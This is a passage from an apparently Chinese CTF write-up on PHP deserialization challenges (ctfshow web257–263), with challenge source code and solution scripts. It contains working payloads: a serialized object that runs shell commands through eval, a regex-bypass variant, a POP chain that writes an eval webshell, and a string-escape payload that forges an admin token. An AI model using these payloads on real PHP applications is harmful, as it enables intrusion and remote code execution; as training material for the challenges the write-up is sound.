    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment"># 要利用的类</span>
<span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{<!-- --></span>
    <span class="token comment"># 关键点，code是可以控制的，code有可以执行代码，这里code=恶意代码</span>
    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
    <span class="token comment"># 方法不能序列化，删除</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>最终代码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$class</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string single-quoted-string">'system("tac flag.php");'</span><span class="token punctuation">;</span>
    <span class="token comment"># 要执行的命令</span>
<span class="token punctuation">}</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
    
<span class="token comment"># O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D</span>
</code></pre> 
<p>payload</p> 
<pre><code>get访问 /?username=xxxxxx&amp;password=xxxxxx
cookie:user=序列化后的字符串
</code></pre> 
<h4><a id="web258_347"></a>web258-空格绕过正则</h4> 
<p>在上题的基础上添加了正则过滤</p> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>正则意思就是 O:数字 C:数字 等的这种情况不能出现，看下原来的 payload</p> 
<pre><code>O:11:"ctfShowUser":1:{s:18:"ctfShowUserclass";O:8:"backDoor":1:{s:14:"backDoorcode";s:23:"system("tac flag.php");";}}
</code></pre> 
<p>可以在<strong>冒号后边加一个空格绕过正则</strong></p> 
<pre><code class="prism language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2011</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUserclass<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">208</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoorcode<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A23<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token function">22system</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">%</span><span class="token number">2</span>Bflag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D
</code></pre> 
<h3><a id="POP_372"></a>POP链</h3> 
<h4><a id="web261__unserialize_374"></a>web261-__unserialize函数</h4> 
<p>先上源码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>整理下魔术方法</p> 
<pre><code class="prism language-php">__construct	构造函数会在每次创建新对象时先调用
    
__wakeup    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数执行时会检查是否存在一个 __wakeup 方法，如果存在，则先被调用
    
<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	当尝试以调用函数的方式调用一个对象时，该方法会被自动调用
    
__sleep		<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数在执行时会检查是否存在一个<span class="token string backtick-quoted-string">`__sleep`</span>魔术方法，如果存在，则先被调用
    
__destruct	析构函数是 php5 新添加的内容，析构函数会在到对象的所有引用都被删除或者当对象被显式销毁时执行
    
<span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数会检查类中是否存在一个魔术方法 <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>。如果存在，该方法将在任何序列化之前优先执行。它必须以一个代表对象序列化形式的 键<span class="token operator">/</span>值 成对的关联数组形式来返回，如果没有返回数组，将会抛出一个 TypeError 错误
注意：
如果类中同时定义了 <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 和 <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 两个魔术方法，则只有 <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法会被调用。 <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法会被忽略掉。如果对象实现了 Serializable 接口，接口的 <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法会被忽略，做为代替类中的 <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法会被调用
    
如果类中同时定义了 <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 和 <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 两个魔术方法，则只有 <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法会生效，<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法会被忽略

<span class="token comment"># __serialize 和 __unserialize 特性自 PHP 7.4.0 起可用    </span>
</code></pre> 
<p>因为存在 <code>__unserialize</code> 函数，所以在 get 传入 vip 的值反序列化时直接调用 <code>__unserialize</code> 而不是 <code>__wakeup</code> 函数</p> 
<p><code>__invoke</code> 方法存在中的 eval 函数，但是却无法利用，但是 <code>__destruct</code> 方法中存在任意文件写入，可以利用写入一句话木马</p> 
<p><code>__unserialize</code>函数中，code = username 的值拼接了 password 的值</p> 
<pre><code class="prism language-php"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span>
</code></pre> 
<p>在 <code>__destruct</code> 方法 比较了 code 的值，但是此处是双等号弱类型比较可以绕过</p> 
<pre><code class="prism language-php">        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre> 
<p>构造代码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php eval($_POST[1]);?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 最好是先实例化一个对象再序列化</span>
<span class="token comment"># 877.php==877是成立的（弱类型比较）</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># urlencode 将不可见字符编码</span>
</code></pre> 
<p>使用蚁剑连接，flag 在根目录</p> 
<p>跟题目提示的打 Redis 没有关系的</p> 
<h4><a id="web262_484"></a>web262-字符串逃逸替换变长</h4> 
<p>贴源码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your message has been sent'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>题目注释中有 message.php</p> 
<pre><code class="prism language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">message</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-&gt;</span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>也就是说需要改变 token 的值才能得到 flag，接下来就需要找到改变 token 值的方法，index.php 中存在字符替换</p> 
<pre><code class="prism language-php"><span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># fuck 替换为 loveU，从四个字符长度替换为五个字符长度</span>
</code></pre> 
<p>但是要注意替换发生在序列化之后，先来看一个普通的序列化字符串</p> 
<pre><code class="prism language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"isVip"</span><span class="token punctuation">;</span><span class="token argument-name">b</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token comment"># O		表示序列化类型为 class</span>
<span class="token comment"># 11	表示类名的长度为11</span>
<span class="token comment"># 1		表示有一对参数</span>
<span class="token comment"># s		表示字符串类型，后边的 5 就表示的是字符串的长度</span>
<span class="token comment"># b		表示Boolean类型true，1就是true</span>
</code></pre> 
<p>php在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>}</code>作为结尾，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化</p> 
<p>回去再看传入的三个值：f、m、t，看看生成的序列化字符串</p> 
<pre><code class="prism language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"message"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"from"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"msg"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"to"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"t"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"token"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p>只要让 t 的值为多个 fuck ，之后替换为 loveU，前边的长度不变，就可以把伪造的含有 admin 的字符串挤出去，替换掉原来的字符串，看下要伪造 admin 字符长度</p> 
<p><img src="https://images2.imgbox.com/b2/74/Zz1EWI9U_o.png" alt="image-20210921132602931"></p> 
<p>只需要准备27个 fuck，</p> 
<pre><code>"fuck"*27
'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck'
</code></pre> 
<p>因为 f 和 m 的值没什么用随便传个值就行</p> 
<p>payload</p> 
<pre><code class="prism language-url">?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
</code></pre> 
<p>然后访问 manage.php</p> 
<h4><a id="web263session_604"></a>web263-session反序列化</h4> 
<p>主页是一个登录界面，使用 dirsearch 扫描发现 www.zip 文件</p> 
<p>index.php</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//超过5次禁止登陆</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
